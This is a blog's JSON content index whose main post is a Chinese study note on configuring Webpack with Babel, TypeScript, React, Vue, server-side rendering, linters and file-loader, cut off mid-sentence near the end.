{"meta":{"title":"AURORA","subtitle":"一蓑烟雨任平生","description":null,"author":"AURORA_ZXH","url":"https://wtaufpziv.github.io","root":"/"},"pages":[{"title":"分类","date":"2024-05-25T02:28:45.287Z","updated":"2024-05-25T02:28:45.287Z","comments":true,"path":"categories/index.html","permalink":"https://wtaufpziv.github.io/categories/index.html","excerpt":"","text":""},{"title":"About Me","date":"2024-05-25T02:28:45.286Z","updated":"2024-05-25T02:28:45.286Z","comments":true,"path":"about/index.html","permalink":"https://wtaufpziv.github.io/about/index.html","excerpt":"","text":"一入前端深似海，从此红尘是路人 姓名：zhangxiaohui现就读：武汉科技大学github：WTAufPzIvQQ：2459917510微信：xh2459917510"},{"title":"timeline","date":"2020-01-27T09:15:47.000Z","updated":"2024-05-25T02:28:45.335Z","comments":true,"path":"timeline/index.html","permalink":"https://wtaufpziv.github.io/timeline/index.html","excerpt":"","text":""},{"title":"友链|link","date":"2024-05-25T02:28:45.332Z","updated":"2024-05-25T02:28:45.332Z","comments":true,"path":"link/index.html","permalink":"https://wtaufpziv.github.io/link/index.html","excerpt":"","text":"zhh的博客：https://wustzhh.github.io/马飞的博客：https://blog.csdn.net/qq_43498164某吴姓大佬的博客：https://asche.top唐流雨的博客：https://blog.csdn.net/qq_40808344涂安龙的博客：https://alotu.github.io江洪的博客：https://www.wuster.vip"},{"title":"分类","date":"2024-05-25T02:28:45.334Z","updated":"2024-05-25T02:28:45.334Z","comments":true,"path":"tags/index.html","permalink":"https://wtaufpziv.github.io/tags/index.html","excerpt":"","text":""},{"title":"photos","date":"2020-08-03T12:01:56.000Z","updated":"2024-05-25T04:21:30.308Z","comments":true,"path":"photos/index.html","permalink":"https://wtaufpziv.github.io/photos/index.html","excerpt":"","text":""}],"posts":[{"title":"深入浅出-Webpack学习笔记（三）","slug":"深入浅出-Webpack学习笔记（三）","date":"2024-05-25T02:28:45.279Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2024/05/25/深入浅出-Webpack学习笔记（三）/","link":"","permalink":"https://wtaufpziv.github.io/2024/05/25/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-Webpack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"接下来学习如何用 Webpack 去解决实际项目中常见的场景","text":"接下来学习如何用 Webpack 去解决实际项目中常见的场景 使用ES6虽然目前部分浏览器和 Node.js 已经支持 ES6，但由于它们对 ES6 所有的标准支持不全，这导致在开发中不敢全面地使用 ES6。 通常我们需要把采用 ES6 编写的代码转换成目前已经支持良好的 ES5 代码，这包含2件事： 把新的 ES6 语法用 ES5 实现，例如 ES6 的 class 语法用 ES5 的 prototype 实现。 给新的 API 注入 polyfill ，例如项目使用 fetch API 时，只有注入对应的 polyfill 后，才能在低版本浏览器中正常运行。 BabelBabel 可以方便的完成以上2件事。 Babel 是一个 JavaScript 编译器，能将 ES6 代码转为 ES5 代码，让你使用最新的语言特性而不用担心兼容性问题，并且可以通过插件机制根据需求灵活的扩展。 在 Babel 执行编译的过程中，会从项目根目录下的 .babelrc 文件读取配置。.babelrc 是一个 JSON 格式的文件，内容大致如下： 1234567891011121314151617181920&#123; \"plugins\": [ [ \"transform-runtime\", &#123; \"polyfill\": false &#125; ] ], \"presets\": [ [ \"es2015\", &#123; \"modules\": false &#125; ], \"stage-2\", \"react\" ]&#125; Pluginsplugins 属性告诉 Babel 要使用哪些插件，插件可以控制如何转换代码。 以上配置文件里的 transform-runtime 对应的插件全名叫做 babel-plugin-transform-runtime，即在前面加上了 babel-plugin-，要让 Babel 正常运行我们必须先安装它： 1npm i -D babel-plugin-transform-runtime babel-plugin-transform-runtime 是 Babel 官方提供的一个插件，作用是减少冗余代码。 Babel 在把 ES6 代码转换成 ES5 代码时通常需要一些 ES5 写的辅助函数来完成新语法的实现，例如在转换 class extent 语法时会在转换后的 ES5 代码里注入 _extent 辅助函数用于实现继承： 1234567891011function _extent(target) &#123; for (var i = 1; i &lt; arguments.length; i++) &#123; var source = arguments[i]; for (var key in source) &#123; if (Object.prototype.hasOwnProperty.call(source, key)) &#123; target[key] = source[key]; &#125; &#125; &#125; return target;&#125; 这会导致每个使用了 class extent 语法的文件都被注入重复的_extent 辅助函数代码，babel-plugin-transform-runtime 的作用在于不把辅助函数内容注入到文件里，而是注入一条导入语句： 1var _extent = require('babel-runtime/helpers/_extent'); 这样能减小 Babel 编译出来的代码的文件大小。 同时需要注意的是由于 babel-plugin-transform-runtime 注入了 require(‘babel-runtime/helpers/_extent’) 语句到编译后的代码里，需要安装 babel-runtime 依赖到你的项目后，代码才能正常运行。 也就是说 babel-plugin-transform-runtime 和 babel-runtime 需要配套使用，使用了 babel-plugin-transform-runtime 后一定需要 babel-runtime。 Presetspresets 属性告诉 Babel 要转换的源码使用了哪些新的语法特性，一个 Presets 对一组新语法特性提供支持，多个 Presets 可以叠加。 Presets 其实是一组 Plugins 的集合，每一个 Plugin 完成一个新语法的转换工作。Presets 是按照 ECMAScript 草案来组织的，通常可以分为以下三大类： 已经被写入 ECMAScript 标准里的特性，由于之前每年都有新特性被加入到标准里，所以又可细分为： es2015 包含在2015里加入的新特性； es2016 包含在2016里加入的新特性； es2017 包含在2017里加入的新特性； env 包含当前所有 ECMAScript 标准里的最新特性。 它们之间的关系如图： 被社区提出来的但还未被写入 ECMAScript 标准里特性，这其中又分为以下四种： stage0 只是一个美好激进的想法，有 Babel 插件实现了对这些特性的支持，但是不确定是否会被定为标准； stage1 值得被纳入标准的特性； stage2 该特性规范已经被起草，将会被纳入标准里； stage3 该特性规范已经定稿，各大浏览器厂商和 Node.js 社区开始着手实现； stage4 在接下来的一年将会加入到标准里去。它们之间的关系如图： 为了支持一些特定应用场景下的语法，和 ECMAScript 标准没有关系，例如 babel-preset-react 是为了支持 React 开发中的 JSX 语法。在实际应用中，你需要根据项目源码所使用的语法去安装对应的 Plugins 或 Presets。 接入 Babel在了解 Babel 后，下一步要知道如何在 Webpack 中使用它。 由于 Babel 所做的事情是转换代码，所以应该通过 Loader 去接入 Babel，Webpack 配置如下： 123456789101112module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.js$/, use: ['babel-loader'], &#125;, ] &#125;, // 输出 source-map 方便直接调试 ES6 源码 devtool: 'source-map'&#125;; 配置命中了项目目录下所有的 JavaScript 文件，通过 babel-loader 去调用 Babel 完成转换工作。 在重新执行构建前，需要先安装新引入的依赖： Webpack 接入 Babel 必须依赖的模块 1npm i -D babel-core babel-loader 根据你的需求选择不同的 Plugins 或 Presets 1npm i -D babel-preset-env 使用TS要让 Webpack 支持 TypeScript，需要解决以下2个问题： 通过 Loader 把 TypeScript 转换成 JavaScript。 Webpack 在寻找模块对应的文件时需要尝试 ts 后缀。 对于问题1，社区已经出现了几个可用的 Loader，推荐速度更快的 awesome-typescript-loader。 对于问题2，根据2-4 Resolve 中的 extensions 我们需要修改默认的 resolve.extensions 配置项。 综上，相关 Webpack 配置如下： 1234567891011121314151617181920212223const path = require('path');module.exports = &#123; // 执行入口文件 entry: './main', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, './dist'), &#125;, resolve: &#123; // 先尝试 ts 后缀的 TypeScript 源码文件 extensions: ['.ts', '.js'] &#125;, module: &#123; rules: [ &#123; test: /\\.ts$/, loader: 'awesome-typescript-loader' &#125; ] &#125;, devtool: 'source-map',// 输出 Source Map 方便在浏览器里调试 TypeScript 代码&#125;; 在运行构建前需要安装上面用到的依赖： 1npm i -D typescript awesome-typescript-loader 安装成功后重新执行构建，你将会在 dist 目录看到输出的 JavaScript 文件 bundle.js，和对应的 Source Map 文件 bundle.js.map。 在浏览器里打开 index.html 页面后，来开发工具里可以看到和调试用 TypeScript 编写的源码。 注意：截止2020年7月，webpack版本为4.44版本，解析ts可以使用ts-loader的4.X版本 你需要在当前项目根目录下新建一个用于配置编译选项的 tsconfig.json 文件，编译器默认会读取和使用这个文件，配置文件内容大致如下： 12345678910&#123; \"compilerOptions\": &#123; \"module\": \"commonjs\", // 编译出的代码采用的模块规范 \"target\": \"es5\", // 编译出的代码采用 ES 的哪个版本 \"sourceMap\": true // 输出 Source Map 方便调试 &#125;, \"exclude\": [ // 不编译这些目录里的文件 \"node_modules\" ]&#125; 使用React使用了 React 项目的代码特征有 JSX 和 Class 语法，例如： 12345class Button extends Component &#123; render() &#123; return &lt;h1&gt;Hello,Webpack&lt;/h1&gt; &#125;&#125; 在使用了 React 的项目里 JSX 和 Class 语法并不是必须的，但使用新语法写出的代码看上去更优雅。 其中 JSX 语法是无法在任何现有的 JavaScript 引擎中运行的，所以在构建过程中需要把源码转换成可以运行的代码，例如： 12345// 原 JSX 语法代码return &lt;h1&gt;Hello,Webpack&lt;/h1&gt;// 被转换成正常的 JavaScript 代码return React.createElement('h1', null, 'Hello,Webpack') 目前 Babel 和 TypeScript 都提供了对 React 语法的支持，下面分别来介绍如何在使用 Babel 或 TypeScript 的项目中接入 React 框架。 React 与 Babel要在使用 Babel 的项目中接入 React 框架是很简单的，只需要加入 React 所依赖的 Presets babel-preset-react。 接下来通过修改前面讲过的3-1 使用 ES6 语言中的项目，为其接入 React 框架。 通过以下命令： 安装 React 基础依赖 1npm i -D react react-dom 安装 babel 完成语法转换所需依赖 1npm i -D babel-preset-react 安装新的依赖后，再修改 .babelrc 配置文件加入 React Presets 123\"presets\": [ \"react\"], 就完成了一切准备工作。 再修改 main.js 文件如下： 1234567891011import * as React from 'react';import &#123; Component &#125; from 'react';import &#123; render &#125; from 'react-dom';class Button extends Component &#123; render() &#123; return &lt;h1&gt;Hello,Webpack&lt;/h1&gt; &#125;&#125;render(&lt;Button/&gt;, window.document.getElementById('app')); 重新执行构建打开网页你将会发现由 React 渲染出来的 Hello,Webpack。 React 与 TypeScriptTypeScript 相比于 Babel 的优点在于它原生支持 JSX 语法，你不需要重新安装新的依赖，只需修改一行配置。 但 TypeScript 的不同在于： 使用了 JSX 语法的文件后缀必须是 tsx。 由于 React 不是采用 TypeScript 编写的，需要安装 react 和 react-dom 对应的 TypeScript 接口描述模块 @types/react 和 @types/react-dom 后才能通过编译。 接下来通过修改3-2 使用 TypeScript 语言中讲过的的项目，为其接入 React 框架。 修改 TypeScript 编译器配置文件 tsconfig.json 增加对 JSX 语法的支持，如下： 12345&#123; \"compilerOptions\": &#123; \"jsx\": \"react\" // 开启 jsx ，支持 React &#125;&#125; 由于 main.js 文件中存在 JSX 语法，再把 main.js 文件重命名为 main.tsx，同时修改文件内容为在上面 React 与 Babel 里所采用的 React 代码。 同时为了让 Webpack 对项目里的 ts 与 tsx 原文件都采用 awesome-typescript-loader 去转换， 需要注意的是 Webpack Loader 配置的 test 选项需要匹配到 tsx 类型的文件，并且 extensions 中也要加上 .tsx，配置如下： 123456789101112131415161718192021222324const path = require('path');module.exports = &#123; // TS 执行入口文件 entry: './main', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, './dist'), &#125;, resolve: &#123; // 先尝试 ts，tsx 后缀的 TypeScript 源码文件 extensions: ['.ts', '.tsx', '.js',] &#125;, module: &#123; rules: [ &#123; // 同时匹配 ts，tsx 后缀的 TypeScript 源码文件 test: /\\.tsx?$/, loader: 'awesome-typescript-loader' &#125; ] &#125;, devtool: 'source-map',// 输出 Source Map 方便在浏览器里调试 TypeScript 代码&#125;; 通过 1npm i react react-dom @types/react @types/react-dom 安装新的依赖后重启构建，重新打开网页你将会发现由 React 渲染出来的 Hello,Webpack 使用Vue认识 VueVue 和 React 一样，它们都推崇组件化和由数据驱动视图的思想，视图和数据绑定在一起，数据改变视图会跟着改变，而无需直接操作视图。 还是以前面的 Hello,Webpack 为例，来看下 Vue 版本的实现。 App.vue 文件代表一个单文件组件，它是项目唯一的组件，也是根组件： 12345678910111213141516171819202122&lt;!--渲染模版--&gt;&lt;template&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;/h1&gt;&lt;/template&gt;&lt;!--样式描述--&gt;&lt;style scoped&gt; h1 &#123; color: red; &#125;&lt;/style&gt;&lt;!--组件逻辑--&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; msg: 'Hello,Webpack' &#125; &#125; &#125;&lt;/script&gt; Vue 的单文件组件通过一个类似 HTML 文件的 .vue 文件就能描述清楚一个组件所需的模版、样式、逻辑。 main.js 入口文件： 1234567import Vue from 'vue'import App from './App.vue'new Vue(&#123; el: '#app', render: h =&gt; h(App)&#125;); 入口文件创建一个 Vue 的根实例，在 ID 为 app 的 DOM 节点上渲染出上面定义的 App 组件。 接入 Webpack目前最成熟和流行的开发 Vue 项目的方式是采用 ES6 加 Babel 转换，这和基本的采用 ES6 开发的项目很相似，差别在于要解析 .vue 格式的单文件组件。 好在 Vue 官方提供了对应的 vue-loader 可以非常方便的完成单文件组件的转换。 修改 Webpack 相关配置如下： 12345678module: &#123; rules: [ &#123; test: /\\.vue$/, use: ['vue-loader'], &#125;, ]&#125; 安装新引入的依赖： Vue 框架运行需要的库 1npm i -S vue 构建所需的依赖 1npm i -D vue-loader css-loader vue-template-compiler 在这些依赖中，它们的作用分别是： vue-loader：解析和转换 .vue 文件，提取出其中的逻辑代码 script、样式代码 style、以及 HTML 模版 template，再分别把它们交给对应的 Loader 去处理。 css-loader：加载由 vue-loader 提取出的 CSS 代码。 vue-template-compiler：把 vue-loader 提取出的 HTML 模版编译成对应的可执行的 JavaScript 代码，这和 React 中的 JSX 语法被编译成 JavaScript 代码类似。预先编译好 HTML 模版相对于在浏览器中再去编译 HTML 模版的好处在于性能更好。 重新启动构建你就能看到由 Vue 渲染出的 Hello,Webpack 了。 使用 TypeScript 编写 Vue 应用从 Vue 2.5.0+ 版本开始，提供了对 TypeScript 的良好支持，使用 TypeScript 编写 Vue 是一个很好的选择，因为 TypeScript 能检查出一些潜在的错误。 下面讲解如何用 Webpack 构建使用 TypeScript 编写的 Vue 应用。 新增 tsconfig.json 配置文件，内容如下： 1234567891011&#123; \"compilerOptions\": &#123; // 构建出 ES5 版本的 JavaScript，与 Vue 的浏览器支持保持一致 \"target\": \"es5\", // 开启严格模式，这可以对 `this` 上的数据属性进行更严格的推断 \"strict\": true, // TypeScript 编译器输出的 JavaScript 采用 es2015 模块化，使 Tree Shaking 生效 \"module\": \"es2015\", \"moduleResolution\": \"node\" &#125;&#125; 以上代码中的 “module”: “es2015” 是为了 Tree Shaking 优化生效，阅读 4-10 使用 TreeShaking 进一步了解。 修改 App.vue 脚本部分内容如下： 12345678910111213&lt;!--组件逻辑--&gt;&lt;script lang=\"ts\"&gt; import Vue from \"vue\"; // 通过 Vue.extend 启用 TypeScript 类型推断 export default Vue.extend(&#123; data() &#123; return &#123; msg: 'Hello,Webpack', &#125; &#125;, &#125;);&lt;/script&gt; 注意 script 标签中的 lang=”ts” 是为了指明代码的语法是 TypeScript。 修改 main.ts 执行入口文件为如下： 1234567import Vue from 'vue'import App from './App.vue'new Vue(&#123; el: '#app', render: h =&gt; h(App)&#125;); 由于 TypeScript 不认识 .vue 结尾的文件，为了让其支持 import App from ‘./App.vue’ 导入语句，还需要以下文件 vue-shims.d.ts 去定义 .vue 的类型： 12345// 告诉 TypeScript 编译器 .vue 文件其实是一个 Vuedeclare module \"*.vue\" &#123; import Vue from \"vue\"; export default Vue;&#125; Webpack 配置需要修改两个地方，如下： 12345678910111213141516171819202122const path = require('path');module.exports = &#123; resolve: &#123; // 增加对 TypeScript 的 .ts 和 .vue 文件的支持 extensions: ['.ts', '.js', '.vue', '.json'], &#125;, module: &#123; rules: [ // 加载 .ts 文件 &#123; test: /\\.ts$/, loader: 'ts-loader', exclude: /node_modules/, options: &#123; // 让 tsc 把 vue 文件当成一个 TypeScript 模块去处理，以解决 moudle not found 的问题，tsc 本身不会处理 .vue 结尾的文件 appendTsSuffixTo: [/\\.vue$/], &#125; &#125;, ] &#125;,&#125;; 除此之外还需要安装新引入的依赖： 1npm i -D ts-loader typescript 构建同构应用认识同构应用现在大多数单页应用的视图都是通过 JavaScript 代码在浏览器端渲染出来的，但在浏览器端渲染的坏处有： 搜索引擎无法收录你的网页，因为展示出的数据都是在浏览器端异步渲染出来的，大部分爬虫无法获取到这些数据。 对于复杂的单页应用，渲染过程计算量大，对低端移动设备来说可能会有性能问题，用户能明显感知到首屏的渲染延迟。 为了解决以上问题，有人提出能否将原本只运行在浏览器中的 JavaScript 渲染代码也在服务器端运行，在服务器端渲染出带内容的 HTML 后再返回。 这样就能让搜索引擎爬虫直接抓取到带数据的 HTML，同时也能降低首屏渲染时间。 由于 Node.js 的流行和成熟，以及虚拟 DOM 提出与实现，使这个假设成为可能。 实际上现在主流的前端框架都支持同构，包括 React、Vue2、Angular2，其中最先支持也是最成熟的同构方案是 React。 由于 React 使用者更多，它们之间又很相似，本节只介绍如何用 Webpack 构建 React 同构应用。 同构应用运行原理的核心在于虚拟 DOM，虚拟 DOM 的意思是不直接操作 DOM 而是通过 JavaScript Object 去描述原本的 DOM 结构。 在需要更新 DOM 时不直接操作 DOM 树，而是通过更新 JavaScript Object 后再映射成 DOM 操作。 虚拟 DOM 的优点在于： 因为操作 DOM 树是高耗时的操作，尽量减少 DOM 树操作能优化网页性能。而 DOM Diff 算法能找出2个不同 Object 的最小差异，得出最小 DOM 操作； 虚拟 DOM 的在渲染的时候不仅仅可以通过操作 DOM 树来表示出结果，也能有其它的表示方式，例如把虚拟 DOM 渲染成字符串(服务器端渲染)，或者渲染成手机 App 原生的 UI 组件( React Native)。 以 React 为例，核心模块 react 负责管理 React 组件的生命周期，而具体的渲染工作可以交给 react-dom 模块来负责。 react-dom 在渲染虚拟 DOM 树时有2中方式可选： 通过 render() 函数去操作浏览器 DOM 树来展示出结果。 通过 renderToString() 计算出表示虚拟 DOM 的 HTML 形式的字符串。 构建同构应用的最终目的是从一份项目源码中构建出2份 JavaScript 代码，一份用于在浏览器端运行，一份用于在 Node.js 环境中运行渲染出 HTML。 其中用于在 Node.js 环境中运行的 JavaScript 代码需要注意以下几点： 不能包含浏览器环境提供的 API，例如使用 document 进行 DOM 操作， 因为 Node.js 不支持这些 API； 不能包含 CSS 代码，因为服务端渲染的目的是渲染出 HTML 内容，渲染出 CSS 代码会增加额外的计算量，影响服务端渲染性能； 不能像用于浏览器环境的输出代码那样把 node_modules 里的第三方模块和 Node.js 原生模块(例如 fs 模块)打包进去，而是需要通过 CommonJS 规范去引入这些模块。 需要通过 CommonJS 规范导出一个渲染函数，以用于在 HTTP 服务器中去执行这个渲染函数，渲染出 HTML 内容返回。 解决方案接下来改造在3-6使用 React 框架中介绍的 React 项目，为它增加构建同构应用的功能。 由于要从一份源码构建出2份不同的代码，需要有2份 Webpack 配置文件分别与之对应。 构建用于浏览器环境的配置和前面讲的没有差别，本节侧重于讲如何构建用于服务端渲染的代码。 用于构建浏览器环境代码的 webpack.config.js 配置文件保留不变，新建一个专门用于构建服务端渲染代码的配置文件 webpack_server.config.js，内容如下： 12345678910111213141516171819202122232425262728293031323334const path = require('path');const nodeExternals = require('webpack-node-externals');module.exports = &#123; // JS 执行入口文件 entry: './main_server.js', // 为了不把 Node.js 内置的模块打包进输出文件中，例如 fs net 模块等 target: 'node', // 为了不把 node_modules 目录下的第三方模块打包进输出文件中 externals: [nodeExternals()], output: &#123; // 为了以 CommonJS2 规范导出渲染函数，以给采用 Node.js 编写的 HTTP 服务调用 libraryTarget: 'commonjs2', // 把最终可在 Node.js 中运行的代码输出到一个 bundle_server.js 文件 filename: 'bundle_server.js', // 输出文件都放到 dist 目录下 path: path.resolve(__dirname, './dist'), &#125;, module: &#123; rules: [ &#123; test: /\\.js$/, use: ['babel-loader'], exclude: path.resolve(__dirname, 'node_modules'), &#125;, &#123; // CSS 代码不能被打包进用于服务端的代码中去，忽略掉 CSS 文件 test: /\\.css$/, use: ['ignore-loader'], &#125;, ] &#125;, devtool: 'source-map' // 输出 source-map 方便直接调试 ES6 源码&#125;; 以上代码有几个关键的地方，分别是： target: &#39;node&#39; 由于输出代码的运行环境是 Node.js，源码中依赖的 Node.js 原生模块没必要打包进去； externals: [nodeExternals()] webpack-node-externals 的目的是为了防止 node_modules 目录下的第三方模块被打包进去，因为 Node.js 默认会去 node_modules 目录下寻找和使用第三方模块； {test: /\\.css$/, use: [&#39;ignore-loader&#39;]} 忽略掉依赖的 CSS 文件，CSS 会影响服务端渲染性能，又是做服务端渲不重要的部分； libraryTarget: &#39;commonjs2&#39; 以 CommonJS2 规范导出渲染函数，以供给采用 Node.js 编写的 HTTP 服务器代码调用。 为了最大限度的复用代码，需要调整下目录结构： 把页面的根组件放到一个单独的文件 AppComponent.js，该文件只能包含根组件的代码，不能包含渲染入口的代码，而且需要导出根组件以供给渲染入口调用，AppComponent.js 内容如下： 12345678import React, &#123; Component &#125; from 'react';import './main.css';export class AppComponent extends Component &#123; render() &#123; return &lt;h1&gt;Hello,Webpack&lt;/h1&gt; &#125;&#125; 分别为不同环境的渲染入口写两份不同的文件，分别是用于浏览器端渲染 DOM 的 main_browser.js 文件，和用于服务端渲染 HTML 字符串的 main_server.js 文件。 main_browser.js 文件内容如下： 123456import React from 'react';import &#123; render &#125; from 'react-dom';import &#123; AppComponent &#125; from './AppComponent';// 把根组件渲染到 DOM 树上render(&lt;AppComponent/&gt;, window.document.getElementById('app')); main_server.js 文件内容如下： 123456789import React from 'react';import &#123; renderToString &#125; from 'react-dom/server';import &#123; AppComponent &#125; from './AppComponent';// 导出渲染函数，以给采用 Node.js 编写的 HTTP 服务器代码调用export function render() &#123; // 把根组件渲染成 HTML 字符串 return renderToString(&lt;AppComponent/&gt;)&#125; 为了能把渲染的完整 HTML 文件通过 HTTP 服务返回给请求端，还需要通过用 Node.js 编写一个 HTTP 服务器。 由于本节不专注于将 HTTP 服务器的实现，就采用了 ExpressJS 来实现，http_server.js 文件内容如下： 1234567891011121314151617181920212223242526const express = require('express');const &#123; render &#125; = require('./dist/bundle_server');const app = express();// 调用构建出的 bundle_server.js 中暴露出的渲染函数，再拼接下 HTML 模版，形成完整的 HTML 文件app.get('/', function (req, res) &#123; res.send(`&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"app\"&gt;$&#123;render()&#125;&lt;/div&gt;&lt;!--导入 Webpack 输出的用于浏览器端渲染的 JS 文件--&gt;&lt;script src=\"./dist/bundle_browser.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; `);&#125;);// 其它请求路径返回对应的本地文件app.use(express.static('.'));app.listen(3000, function () &#123; console.log('app listening on port 3000!')&#125;); 再安装新引入的第三方依赖： 安装 Webpack 构建依赖 1npm i -D css-loader style-loader ignore-loader webpack-node-externals 安装 HTTP 服务器依赖 1npm i -S express 以上所有准备工作已经完成，接下来执行构建，编译出目标文件： 执行命令 webpack --config webpack_server.config.js 构建出用于服务端渲染的 ./dist/bundle_server.js 文件。执行命令 webpack 构建出用于浏览器环境运行的 ./dist/bundle_browser.js 文件，默认的配置文件为 webpack.config.js。构建执行完成后，执行 node ./http_server.js 启动 HTTP 服务器后，再用浏览器去访问 http://localhost:3000 就能看到 Hello,Webpack 了。 但是为了验证服务端渲染的结果，你需要打开浏览器的开发工具中的网络抓包一栏，再重新刷新浏览器后，就能抓到请求 HTML 的包了，抓包效果图如下： 可以看到服务器返回的是渲染出内容后的 HTML 而不是 HTML 模版，这说明同构应用的改造完成。 检查代码当项目代码变得日益庞大复杂时，如何保障代码质量？如何保障多人协助开发时代码的可读性？ 完全解决以上问题不是一个简单的事，但做检查代码能解决大部分问题。本节将教你如何结合构建做代码检查。 代码检查具体是做什么检查代码和 Code Review 很相似，都是去审视提交的代码可能存在的问题。 但 Code Review 一般通过人去执行，而检查代码是通过机器去执行一些自动化的检查。 自动化的检查代码成本更低，实施代价更小。 检查代码主要检查以下几项： 代码风格：让项目成员强制遵守统一的代码风格，例如如何缩进、如何写注释等，保障代码可读性，不把时间浪费在争论如何写代码更好看上； 潜在问题：分析出代码在运行过程中可能出现的潜在 Bug。 其中检查代码风格相关的工具很多也很成熟，分析潜在问题的检查由于情况复杂目前还没有成熟的工具。 目前已经有成熟的工具可以检验诸如 JavaScript、TypeScript、CSS、SCSS 等常用语言。 怎么做代码检查在做代码风格检查时需要按照不同的文件类型来检查，下面来分别介绍。 检查 JavaScript目前最常用的 JavaScript 检查工具是 ESlint ，它不仅内置了大量常用的检查规则，还可以通过插件机制做到灵活扩展。 ESlint 的使用很简单，在通过 1npm i -g eslint 按照到全局后，再在项目目录下执行 1eslint --init 来新建一个 ESlint 配置文件 .eslintrc，该文件格式为 JSON。 如果你想覆盖默认的检查规则，或者想加入新的检查规则，你需要修改该文件，例如使用以下配置： 1234567891011&#123; // 从 eslint:recommended 中继承所有检查规则 \"extends\": \"eslint:recommended\", // 再自定义一些规则 \"rules\": &#123; // 需要在每行结尾加 ; \"semi\": [\"error\", \"always\"], // 需要使用 \"\" 包裹字符串 \"quotes\": [\"error\", \"double\"] &#125;&#125; 写好配置文件后，再执行 1eslint yourfile.js 去检查 yourfile.js 文件，如果你的文件没有通过检查，ESlint 会输出错误原因，例如： 12345/yourfile.js 296:13 error Strings must use doublequote quotes 298:7 error Missing semicolon semi✖ 2 problems (2 errors, 0 warnings) ESlint 还有很多功能和检查规则，由于篇幅有限这里就不详细介绍，可以去其官网阅读文档。 检查 TypeScriptTSLint 是一个和 ESlint 相似的 TypeScript 代码检查工具，区别在于 TSLint 只专注于检查 TypeScript 代码。 TSLint 和 ESlint 的使用方法很相似，首先通过 1npm i -g tslint 按照到全局，再去项目根目录下执行 1tslint --init 生成配置文件 tslint.json，在配置好后，再执行 1tslint yourfile.ts 去检查 yourfile.ts 文件。 检查 CSSstylelint 是目前最成熟的 CSS 检查工具，内置了大量检查规则的同时也提供插件机制让用户自定义扩展。 stylelint 基于 PostCSS，能检查任何 PostCSS 能解析的代码，诸如 SCSS、Less 等。 首先通过 1npm i -g stylelint 按照到全局后，去项目根目录下新建 .stylelintrc 配置文件， 该配置文件格式为 JSON，其格式和 ESLint 的配置相似，例如： 12345678&#123; // 继承 stylelint-config-standard 中的所有检查规则 \"extends\": \"stylelint-config-standard\", // 再自定义检查规则 \"rules\": &#123; \"at-rule-empty-line-before\": null &#125;&#125; 配置好后，再执行 1stylelint \"yourfile.css\" 去检查 yourfile.css 文件。 stylelint 还有很多功能和配置项没有介绍到，可以访问其官方进一步了解。 目前很多编辑器，例如 Webstorm、VSCode 等，已经集成了以上介绍过的检查工具，编辑器会实时地把检查工具输出的错误显示编辑的源码上。 通过编辑器集成后，你不用通过命令行的方式去定位错误。 结合 Webpack 检查代码以上介绍的代码检查工具可以和 Webpack 结合起来，在开发过程中通过 Webpack 输出实时的检查结果。 结合 ESLinteslint-loader 可以方便的把 ESLint 整合到 Webpack 中，使用方法如下： 1234567891011121314module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.js$/, // node_modules 目录的下的代码不用检查 exclude: /node_modules/, loader: 'eslint-loader', // 把 eslint-loader 的执行顺序放到最前面，防止其它 Loader 把处理后的代码交给 eslint-loader 去检查 enforce: 'pre', &#125;, ], &#125;,&#125; 接入 eslint-loader 后就能在控制台中看到 ESLint 输出的错误日志了。 结合 TSLinttslint-loader 是一个和 eslint-loader 相似的 Webpack Loader， 能方便的把 TSLint 整合到 Webpack，其使用方法如下： 1234567891011121314module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.ts$/, // node_modules 目录的下的代码不用检查 exclude: /node_modules/, loader: 'tslint-loader', // 把 tslint-loader 的执行顺序放到最前面，防止其它 Loader 把处理后的代码交给 tslint-loader 去检查 enforce: 'pre', &#125;, ], &#125;,&#125; 结合 stylelintStyleLintPlugin 能把 stylelint 整合到 Webpack，其使用方法很简单，如下： 12345678const StyleLintPlugin = require('stylelint-webpack-plugin');module.exports = &#123; // ... plugins: [ new StyleLintPlugin(), ],&#125; 一些建议把代码检查功能整合到 Webpack 中会导致以下问题： 由于执行检查步骤计算量大，整合到 Webpack 中会导致构建变慢； 在整合代码检查到 Webpack 后，输出的错误信息是通过行号来定位错误的，没有编辑器集成显示错误直观； 为了避免以上问题，还可以这样做： 使用集成了代码检查功能的编辑器，让编辑器实时直观地显示错误； 把代码检查步骤放到代码提交时，也就是说在代码提交前去调用以上检查工具去检查代码，只有在检查都通过时才提交代码，这样就能保证提交到仓库的代码都是通过了检查的。 如果你的项目是使用 Git 管理，Git 提供了 Hook 功能能做到在提交代码前触发执行脚本。 husky 可以方便快速地为项目接入 Git Hook， 执行 1npm i -D husky 安装 husky 时，husky 会通过 Npm Script Hook 自动配置好 Git Hook，你需要做的只是在 package.json 文件中定义几个脚本，方法如下： 12345678910&#123; \"scripts\": &#123; // 在执行 git commit 前会执行的脚本 \"precommit\": \"npm run lint\", // 在执行 git push 前会执行的脚本 \"prepush\": \"lint\", // 调用 eslint、stylelint 等工具检查代码 \"lint\": \"eslint &amp;&amp; stylelint\" &#125;&#125; precommit 和 prepush 你需要根据自己的情况选择一个，无需两个都设置。 加载图片和其他静态资源在网页中不可避免的会依赖图片资源，例如 PNG、JPG、GIF，下面来教你如何用 Webpack 加载图片资源。 使用 file-loaderfile-loader 可以把 JavaScript 和 CSS 中导入图片的语句替换成正确的地址，并同时把文件输出到对应的位置。 例如 CSS 源码是这样写的： 123#app &#123; background-image: url(./imgs/a.png);&#125; 被 file-loader 转换后输出的 CSS 会变成这样： 123#app &#123; background-image: url(5556e1251a78c5afda9ee7dd06ad109b.png);&#125; 并且在输出目录 dist 中也多出 ./imgs/a.png 对应的图片文件 5556e1251a78c5afda9ee7dd06ad109b.png， 输出的文件名是根据文件内容的计算出的 Hash 值。 同理在 JavaScript 中导入图片的源码如下： 1234import imgB from 